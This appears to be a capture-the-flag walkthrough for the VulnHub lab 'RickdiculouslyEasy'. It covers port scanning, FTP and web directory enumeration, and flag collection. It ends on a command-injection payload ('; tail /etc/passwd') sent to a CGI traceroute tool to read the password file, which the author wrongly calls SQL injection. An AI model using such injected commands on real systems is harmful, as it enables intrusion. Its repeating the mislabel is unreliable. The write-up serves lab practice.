# RickdiculouslyEasy: 1

#### Download the machine from vulnhub or go for the [link](https://drive.google.com/open?id=0BzB6wBgc606JNmNNdU9waGNGTmM)
![rick wall](https://user-images.githubusercontent.com/112984045/202390970-89a77c0e-1a02-437a-a4e1-1fc2ace6dbac.png)
<br>

* #### This is a direct walk-through to the flag. Hopping that you have given your best before referring to this write-up
* #### Do follow this page through out the line to void confusion.

### `setup the machine to vmware or virtualbox and run the machine.`
### `It is recommended to keep both attack and 'RickdiculouslyEasy' machines on either briged or NAT network`
### ` After a successful setup go for the commands :`<br>
* #### Remember that the total points to be attained = 130 <br>


## ENUMERATION :

```bash
netdiscover -i < interface >
```
`Example command : netdiscover -i eth0`<br>
![rick netdiscover](https://user-images.githubusercontent.com/112984045/202392016-4d8bd306-0c80-4ad0-bdc2-585eb725ad86.png)
<br>

* For ENUMERATION we use nmap tool which come by default in kali linux.
 <br>command :
 
```bash
nmap -sC -sV -T4 < IP >
```
![rick nmap](https://user-images.githubusercontent.com/112984045/202393571-4f039d87-bbd9-470b-8f55-9bddb3a3453a.png)<br>
  ~ we can add -v argument for more verbose output.<br>
 
* I usually perform one more scan by using my personal tool : [port-scanner](https://github.com/shybu9/port-Scanner)
![rick portscanner](https://user-images.githubusercontent.com/112984045/202403637-cc4fc199-850f-4bd8-a790-80e305916fbc.png)<br>
* Thanks to my tool, It had found a flag at scanning itself before the nmap scan was done<br>

~ I prefer this tool because of its speed as you can see it just took 37 seconds for scanning 65535 ports.<br>Even still some improvements are to be done
 <br>
 
 ## ` points : 10`
 <br>
 
 * Try one more nmap scan with command :
 ```bash
 nmap -sV -sC  -T4 -vv -Pn -p- <br>
 ```
 
  ### ANALYSING ALL THE SCANS :
 * number of OPEN PORTS : 7
 * PORT NUMBERS : 21,22,80,9090,13337,22222,60000
 * OPERATING SYSTEM : UNIX, Linux
 * service running on PORT 21    : ftp
 * service running on PORT 22    : ssh
 * service running on PORT 80    :  Apache/2.4.27 (Fedora)
 * service running on PORT 9090  : Apache/2.4.27 (Fedora)
 * service running on PORT 13337 : unknown
 * service running on PORT 22222 : SSH-2.0-OpenSSH_7.5
 * service running on PORT 60000 : unknown
<br>
  
 * As the port 21 is open lets go for it :
 ```bash
 ftp <IP>
 ```
 ![rick ftp](https://user-images.githubusercontent.com/112984045/202398047-50f86fe1-e337-4b4d-97bd-a9ae834ad33b.png)<br>
 * Terminate the ftp server and look for FLAG.txt
 ```bash
 cat FLAG.txt
 ```
 ![rick 1 ftpflag](https://user-images.githubusercontent.com/112984045/202398637-5237a77d-5bf5-43e0-9071-b7ac2e1ed1b8.png)
<br>

## ` POINTS : 20`
<br>

* As the port 80 is open lets have a look on web pages using IP
 ```bash
 http://<IP>
 ```
 <br>
 
 * Nothing to do with the home page<br>
```bash
gobuster dir -u 192.168.0.102/  --no-error -w /usr/share/wordlists/dirb/big.txt -t 50
```
![rick gobu big 80](https://user-images.githubusercontent.com/112984045/202400675-bfa7167f-cd24-4e3f-8208-80a296c1708d.png)
```bash
gobuster dir -u 192.168.0.102/  --no-error -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
``` 
![rick gobu med 80](https://user-images.githubusercontent.com/112984045/202400725-7a42cd58-9e28-4a25-8afa-d22b8798e880.png)<br>
<br>

```bash
http://< IP >/passwords/FLAG.txt
```
![rick 2 80 flag](https://user-images.githubusercontent.com/112984045/202401188-cb95b535-2ddb-4556-8ef0-823dc447d592.png)<br>

## `POINTS : 30`
<br>

* As the port 9090 is also open http, lets have a look at that to
```bash
https://< IP >:9090/
```
![rick 3 9090 flag](https://user-images.githubusercontent.com/112984045/202404793-8bc9c025-88b7-4b12-bfb4-c89380517807.png)<br>

## `POINTS : 40`
<br>

* Back to port 80 web
```bash
http://< IP >/robots.txt
```
![rick robots](https://user-images.githubusercontent.com/112984045/202860080-3ee53497-1941-42f5-becd-c10e76c98327.png)<br>

```bash
http://< IP >/cgi-bin/tracertool.cgi
```
![rick tracrroute](https://user-images.githubusercontent.com/112984045/202860217-1a4eb34c-297b-4ce8-9225-a510dcafb84c.png)<br>

` this web-page is vuln to sqli so try command :`
```bash
; tail /etc/passwd
```
or
```bash
http://< IP >/cgi-bin/tracertool.cgi?ip=%3B+tail+%2Fetc%2Fpasswd
```
<br>

* Now we have 3 usernames












